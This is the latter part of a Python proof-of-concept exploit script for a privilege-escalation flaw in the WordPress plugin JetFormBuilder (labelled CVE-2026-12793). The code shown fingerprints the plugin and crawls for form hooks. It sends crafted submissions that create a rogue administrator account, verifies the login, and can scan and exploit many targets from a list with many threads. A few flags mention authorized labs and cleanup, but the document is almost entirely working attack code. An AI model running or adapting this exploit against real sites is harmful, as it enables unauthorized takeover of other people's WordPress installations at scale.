        if a["name"] in ("screenoptionnonce","wp_screen_options[option]"): continue
        form[a["name"]] = a.get("value","")
    POST(op, base + "/wp-admin/users.php", form, timeout=timeout, referer=cu)
    return True

# ----------------------------------------------------------------------
# fingerprint
# ----------------------------------------------------------------------
def fingerprint(base, timeout):
    inf = {"plugin_present": False, "version": "", "source": ""}
    op = opener()
    for p in ("/wp-content/plugins/jetformbuilder/readme.txt",
              "/wp-content/plugins/jetformbuilder/jet-form-builder.php"):
        r = GET(op, base + p, timeout=timeout)
        if r.status != 200 or "<html" in r.body[:200].lower(): continue
        inf["plugin_present"] = True
        m = STABLE_TAG_RE.search(r.body) or re.search(r"Version:\s*([0-9][0-9A-Za-z.\-]*)", r.body)
        if m: inf["version"], inf["source"] = m.group(1), p; break
    if not inf["version"]:
        r = GET(op, base + "/", timeout=timeout)
        m = re.search(r"jetformbuilder[^\"']*?\?ver=([0-9][0-9A-Za-z.\-]*)", r.body)
        if m:
            inf["plugin_present"] = True
            inf["version"], inf["source"] = m.group(1), "front ?ver="
    return inf

# ----------------------------------------------------------------------
# ScanResult + scan_one
# ----------------------------------------------------------------------
@dataclass
class ScanResult:
    target: str
    exit_code: int = 3
    plugin_version: str = "?"
    hook: str = ""
    oracle: str = "INCONCLUSIVE"
    exploited: bool = False
    reason: str = ""
    note: str = ""
    log_text: str = ""

def scan_one(target, args, is_list_mode=False):
    _reset_log()
    if is_list_mode:
        _TL.silent = True  # buffer only, no terminal print
    res = ScanResult(target=target)
    try:
        if not re.match(r"^https?://", target): target = "http://" + target
        target = target.rstrip("/")
        target = probe_wp_base(target, args.timeout).rstrip("/")
        res.target = target

        if not is_list_mode:
            banner("CVE-2026-12793 · JetFormBuilder <= 3.6.2")
            log(f"{colorize('target :', C.BCYAN, C.BOLD)} {target}")
        okr, _, reason = resolve_target(target, raise_on_fail=False)
        if not okr:
            res.exit_code = 9; res.reason = reason; res.note = reason
            res.log_text = "\n".join(_logbuf()); return res

        # canonical origin
        if not args.no_follow_origin:
            canon = canonical_origin(target, args.timeout)
            if canon and origin_of(canon) != origin_of(target):
                if is_local_origin(canon) or FOLLOW_ORIGIN:
                    log(f"[!] canonical -> {canon}")
                    target = canon.rstrip("/")
                    res.target = target
                    if target.startswith("https://"): globals()["INSECURE"] = True
                else:
                    res.exit_code = 9
                    res.reason = f"canonical origin not local: {canon}"
                    res.log_text = "\n".join(_logbuf()); return res

        if args.cleanup:
            cleanup_user(target, args.username, args, args.timeout)
            if args.planted_id:
                for pid in [int(x) for x in str(args.planted_id).replace(",", " ").split()
                            if x.strip().isdigit()]:
                    delete_post(target, pid, args, args.timeout)
            res.exit_code = 0; res.reason = "cleanup done"
            res.log_text = "\n".join(_logbuf()); return res

        site = Site(base=target)
        # global hook override (or per-list if args.hook_key given)
        if args.hook_key and args.hook_value:
            site.hook_key, site.hook_val = args.hook_key, args.hook_value

        info_ = fingerprint(target, args.timeout)
        res.plugin_version = info_["version"] or "?"
        log(f"    JetFormBuilder={info_['plugin_present']} v={info_['version'] or '?'}")

        seeds = [s for s in (args.discover_page or "").split(",") if s]
        crawl(site, seeds, args.max_pages, args.timeout)
        if not site.hook_key and not FAST:
            rest_harvest(site, args.timeout)

        # ---- phase 2b: bootstrap (list mode: only with --bootstrap-in-list) ----
        boot = None
        allow_boot = (not is_list_mode) or args.bootstrap_in_list
        if not site.hook_key and allow_boot:
            if READ_ONLY: log("    --read-only: skip bootstrap")
            elif args.no_plant: log("    --no-plant: skip bootstrap")
            else:
                boot = bootstrap_hook(site, args, args.timeout)
                if boot["ok"]:
                    log(f"    [+] bootstrap OK: {boot['why']}")
                else:
                    log(f"    [!] bootstrap FAILED: {boot['why']}")

        if not site.hook_key:
            res.exit_code = 2
            res.oracle = "INCONCLUSIVE"
            res.reason = ("no hook harvested and bootstrap unavailable"
                          if not allow_boot else "no hook harvested (bootstrap failed)")
            if boot and not boot["ok"]:
                res.reason += f": {boot['why'][:80]}"
            res.note = res.reason
            if not is_list_mode: _print_full_report(args, info_, site, None,
                                                    {"verdict":"inconclusive","proof":None,
                                                     "reason":res.reason,"why":res.reason},
                                                    None, None, boot)
            res.log_text = "\n".join(_logbuf()); return res

        res.hook = f"?{site.hook_key}={site.hook_val}&method={site.method}"

        if args.hook_only:
            res.exit_code = 0; res.reason = "hook found"
            res.log_text = "\n".join(_logbuf()); return res

        planted = None
        do_plant = (not args.no_plant) and (not READ_ONLY)
        if not do_plant and not args.form_id:
            log("    skip plant (--no-plant/--read-only)")
        elif args.form_id:
            log(f"    --form-id {args.form_id}")
        elif not is_list_mode or args.bootstrap_in_list:
            planted = plant(target, args, args.timeout)
            if planted["ok"]:
                log(f"    [+] carrier {planted['post_id']}")
                site.post_ids.insert(0, planted["post_id"])
            else:
                log(f"    [!] plant failed: {planted['why']}")

        det = detect(site, args.timeout,
                     planted_id=(planted["post_id"] if planted and planted["ok"] else 0))
        res.oracle = det["verdict"].upper()
        res.reason = det.get("reason") or det["why"][:100]

        exp = login = None
        do_exploit = args.allow_exploit or (not is_list_mode and not args.no_exploit)
        if do_exploit:
            refer = args.refer or site.origin + "/"
            userdata = build_userdata(args.username, args.password, args.email, args.role)
            carriers = []
            if args.form_id: carriers.append((args.form_id, args.field_name, {}, "--form-id"))
            if planted and planted["ok"]:
                carriers.append((planted["post_id"], planted["field"], {}, "planted"))
            for rf in site.forms:
                extra = {k:v for k,v in rf.hidden.items()
                         if k not in (FORM_KEY, REFER_KEY, "__queried_post_id")}
                if rf.form_id and rf.form_id not in [c[0] for c in carriers]:
                    carriers.append((rf.form_id, args.field_name, extra, "rendered"))
            exp = {"ok":False,"resp":None,"form_id":None,"field_name":args.field_name,
                   "why":"no carrier to try"}
            for fid, fname, extra, why in carriers:
                payload = {FORM_KEY:fid, REFER_KEY:refer,
                           "__queried_post_id":args.queried_post_id, fname: userdata}
                payload.update(extra)
                r = POST(opener(), endpoint_of(site), payload,
                         referer=refer, timeout=args.timeout)
                exp.update(resp=r, form_id=fid, field_name=fname)
                ok_, ev, _, _ = verify_login(site.base, args.username, args.password, args.timeout)
                if ok_:
                    exp["ok"], login = True, (ok_, ev, None)
                    res.exploited = True
                    log(f"    [+] LOGIN OK — {ev}")
                    break
                exp["why"] = f"submit status={r.resp_status or 'n/a'}; login failed"

        if not is_list_mode:
            _print_full_report(args, info_, site, planted, det, exp, login, boot)

        res.exit_code = (0 if (exp and exp["ok"]) else
                         0 if det["verdict"] == "vulnerable" else
                         1 if det["verdict"] == "patched" else 3)
    except TargetError as e:
        res.exit_code = e.code; res.reason = str(e); res.note = str(e)
    except SystemExit as e:
        res.exit_code = int(e.code) if isinstance(e.code, int) else 1
        res.reason = f"exit {e.code}"; res.note = res.reason
    except Exception as e:
        res.exit_code = 3
        res.reason = f"{type(e).__name__}: {e}"[:120]
        res.note = res.reason

    res.log_text = "\n".join(_logbuf())
    return res

# ----------------------------------------------------------------------
# full report for single mode
# ----------------------------------------------------------------------
def _print_full_report(args, info_, site, planted, det, exp, login, boot=None):
    banner("RAW SERVER RESPONSES")
    for i, chunk in enumerate(_logbuf(), 1):
        log(); log(dim(f"### request {i}")); log(chunk)
    banner("RESULT")
    kv("target", args.url)
    kv("origin", site.origin or "(unknown)")
    kv("hook",
       f"?{site.hook_key}={site.hook_val}&method={site.method}" if site.hook_key else "NOT FOUND",
       C.BGREEN if site.hook_key else C.BRED)
    kv("crawled", f"pages={len(site.pages)} forms={len(site.forms)} ids={len(site.post_ids)}")
    if info_["plugin_present"]:
        kv("plugin", f"jetformbuilder {info_['version'] or '?'}   [{info_['source']}]")
    else:
        kv("plugin", "not detected", C.BYELLOW)
    log()
    v = det["verdict"]
    vc = C.BGREEN if v=="vulnerable" else C.BRED if v=="patched" else C.BYELLOW
    kv("oracle", v.upper(), vc)
    log(f"{colorize('reason'.ljust(20)+':', C.BCYAN, C.BOLD)} {det.get('reason') or det['why']}")
    log()
    if exp and exp["ok"]:
        log(ok("PRIVILEGE ESCALATION: SUCCESS"))
        log(f"  account: {args.username} : {args.password}")
        log(f"  undo   : python3 {sys.argv[0]} {args.url} --cleanup")
    elif exp is not None:
        log(err("PRIVILEGE ESCALATION: NOT ACHIEVED"))
        log(f"  why: {exp.get('why','')}")
    log()
    log(colorize("="*78, C.BCYAN, C.BOLD))
    if exp and exp["ok"]: log(ok("FINAL: EXPLOITED"))
    elif det["verdict"]=="vulnerable": log(warn("FINAL: VULNERABLE"))
    elif det["verdict"]=="patched": log(bad("FINAL: NOT VULNERABLE"))
    else: log(warn("FINAL: INCONCLUSIVE"))
    log(colorize("="*78, C.BCYAN, C.BOLD))

# ----------------------------------------------------------------------
# mass scan
# ----------------------------------------------------------------------
def read_targets(path):
    out = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"): continue
            out.append(line)
    return out

def print_summary_table(results):
    banner(f"MASS SCAN SUMMARY  ({len(results)} targets)")
    hdr = f"{'#':<4} {'TARGET':<46} {'VER':<9} {'HOOK':<5} {'ORACLE':<14} REASON"
    log(colorize(hdr, C.BCYAN, C.BOLD))
    log(colorize("-" * 120, C.DIM))
    counts = {"vuln":0,"patch":0,"incon":0,"expl":0}
    for i, r in enumerate(results, 1):
        t = r.target[:44]
        v = (r.plugin_version or "?")[:8]
        hk = "YES" if r.hook else "no"
        orc = r.oracle
        reason = (r.reason or "")[:60]
        oc = C.BGREEN if orc=="VULNERABLE" else C.BRED if orc=="PATCHED" else C.BYELLOW
        hc = C.BGREEN if r.hook else C.BRED
        explo = colorize(" EXP", C.BGREEN, C.BOLD) if r.exploited else ""
        log(f"{i:<4} {t:<46} {v:<9} {colorize(hk, hc):<5} {colorize(orc, oc):<14} {reason}{explo}")
        if orc == "VULNERABLE": counts["vuln"] += 1
        elif orc == "PATCHED": counts["patch"] += 1
        else: counts["incon"] += 1
        if r.exploited: counts["expl"] += 1
    log()
    log(info("Totals:"))
    log(f"  {colorize(str(counts['vuln']), C.BGREEN, C.BOLD)} vulnerable   "
        f"{colorize(str(counts['patch']), C.BRED, C.BOLD)} patched   "
        f"{colorize(str(counts['incon']), C.BYELLOW, C.BOLD)} inconclusive   "
        f"{colorize(str(counts['expl']), C.BGREEN, C.BOLD)} exploited")
    log()
    vuln = [r.target for r in results if r.oracle == "VULNERABLE"]
    if vuln:
        log(info("Vulnerable targets:"))
        for t in vuln: log(f"  {good(t)}")
    incon = [r for r in results if r.oracle == "INCONCLUSIVE"]
    if incon:
        log()
        log(warn(f"{len(incon)} INCONCLUSIVE — reasons:"))
        from collections import Counter
        for reason, n in Counter([r.reason.split(":")[0][:70] for r in incon]).most_common(8):
            log(f"  {n:>3}x  {reason}")

def run_list(path, args):
    targets = read_targets(path)
    if not targets:
        log(err(f"[!] no targets in {path}")); return 2

    banner(f"MASS SCAN — {len(targets)} targets, {args.threads} thread(s)")
    log(f"{colorize('list    :', C.BCYAN, C.BOLD)} {path}")
    log(f"{colorize('threads :', C.BCYAN, C.BOLD)} {args.threads}")
    log(f"{colorize('timeout :', C.BCYAN, C.BOLD)} {args.timeout}s")
    log(f"{colorize('exploit :', C.BCYAN, C.BOLD)} "
        f"{'ENABLED' if args.allow_exploit else 'disabled (detect-only)'}")
    log(f"{colorize('bootstrap:', C.BCYAN, C.BOLD)} "
        f"{'ENABLED (--bootstrap-in-list)' if args.bootstrap_in_list else 'disabled'}")
    if args.save_logs:
        os.makedirs(args.save_logs, exist_ok=True)
        log(f"{colorize('logs    :', C.BCYAN, C.BOLD)} {args.save_logs}/")
    log()
    log(dim(f"Starting {args.threads} workers…"))

    results: list = []
    done_count = [0]
    total = len(targets)
    lock = PRINT_LOCK
    stop = threading.Event()
    started = time.time()

    def _worker(t):
        if stop.is_set(): return None
        r = scan_one(t, args, is_list_mode=True)
        with lock:
            done_count[0] += 1
            n = done_count[0]
            oc = (C.BGREEN if r.oracle == "VULNERABLE"
                  else C.BRED if r.oracle == "PATCHED"
                  else C.BYELLOW)
            tag = colorize(f"[{r.oracle:<12}]", oc)
            explo = colorize(" EXPLOITED", C.BGREEN, C.BOLD) if r.exploited else ""
            reason = ("  " + dim(r.reason[:60])) if r.reason else ""
            print(f"  [{n:>3}/{total}] {tag} {r.target}{explo}{reason}", flush=True)
        if args.stop_on_vuln and (r.oracle == "VULNERABLE" or r.exploited):
            stop.set()
        if args.save_logs:
            safe = re.sub(r"[^A-Za-z0-9_.-]", "_", r.target)[:80]
            try:
                with open(os.path.join(args.save_logs, safe + ".log"), "w") as fh:
                    fh.write(f"# {r.target}\nexit={r.exit_code} oracle={r.oracle} "
                             f"exploited={r.exploited}\nreason={r.reason}\n\n{r.log_text}\n")
            except OSError:
                pass
        return r

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = [ex.submit(_worker, t) for t in targets]
        for f in concurrent.futures.as_completed(futs):
            try:
                r = f.result()
                if r is not None: results.append(r)
            except Exception as e:
                print(f"  worker error: {type(e).__name__}: {e}", flush=True)

    elapsed = time.time() - started
    print_summary_table(results)
    log(info(f"elapsed: {elapsed:.1f}s   ({elapsed/max(1,len(results)):.2f}s per target)"))
    return 0

# ----------------------------------------------------------------------
# main
# ----------------------------------------------------------------------
def main():
    p = argparse.ArgumentParser(prog="poc.py")
    p.add_argument("url", nargs="?")
    p.add_argument("--list", dest="list_file", default="")
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--stop-on-vuln", action="store_true")
    p.add_argument("--only-vulnerable", action="store_true")
    p.add_argument("--save-logs", default="", metavar="DIR")
    p.add_argument("--bootstrap-in-list", action="store_true",
                   help="list mode: allow creating a form + page per target "
                        "(requires working --admin-user/--admin-pass). Authorized labs only.")

    p.add_argument("--field-name", default=DEFAULT_FIELD)
    p.add_argument("--callback", default=DEFAULT_CALLBACK)
    p.add_argument("--form-id", type=int, default=0)
    p.add_argument("--username", default="labowner")
    p.add_argument("--password", default="LabPass!2345")
    p.add_argument("--email", default="")
    p.add_argument("--role", default="administrator")
    p.add_argument("--queried-post-id", default="-1")
    p.add_argument("--refer", default="")
    p.add_argument("--hook-key", default="")
    p.add_argument("--hook-value", default="")
    p.add_argument("--discover-page", default="")
    p.add_argument("--max-pages", type=int, default=8)
    p.add_argument("--timeout", type=int, default=10)

    p.add_argument("--no-plant", action="store_true")
    p.add_argument("--no-exploit", action="store_true")
    p.add_argument("--allow-exploit", action="store_true")
    p.add_argument("--hook-only", action="store_true")
    p.add_argument("--read-only", action="store_true")
    p.add_argument("--cleanup", action="store_true")
    p.add_argument("--planted-id", default="0")
    p.add_argument("--admin-user", default="admin")
    p.add_argument("--admin-pass", default="adminpass123")
    p.add_argument("--print-markup", action="store_true")

    p.add_argument("--insecure", action="store_true")
    p.add_argument("--no-follow-origin", action="store_true")
    p.add_argument("--follow-origin", action="store_true")
    p.add_argument("--local-only", action="store_true")
    p.add_argument("--fast", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    global VERBOSE, READ_ONLY, INSECURE, LOCAL_ONLY, FOLLOW_ORIGIN, FAST, USE_COLOR
    VERBOSE = args.verbose
    READ_ONLY = args.read_only
    INSECURE = args.insecure
    LOCAL_ONLY = args.local_only
    FOLLOW_ORIGIN = args.follow_origin
    FAST = args.fast
    if args.no_color: USE_COLOR = False
    if READ_ONLY:
        args.no_plant = True; args.no_exploit = True

    if args.print_markup:
        log(dim("# Carrier block content:"))
        log(colorize(build_block_markup(args.field_name, args.callback), C.BGREEN))
        return 0

    if args.list_file:
        if args.url:
            log(err("[!] give either URL or --list, not both.")); return 2
        return run_list(args.list_file, args)

    if args.url and not re.match(r"^https?://", args.url):
        args.url = "http://" + args.url
    if not args.url:
        args.url = discover_local_wordpress(args.timeout)
        if not args.url:
            log(err("[!] no local WordPress found; use --list FILE for mass scan"))
            return 2
        log(f"[+] using {args.url}")
    args.email = args.email or f"{args.username}@example.test"

    res = scan_one(args.url, args, is_list_mode=False)
    return res.exit_code

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
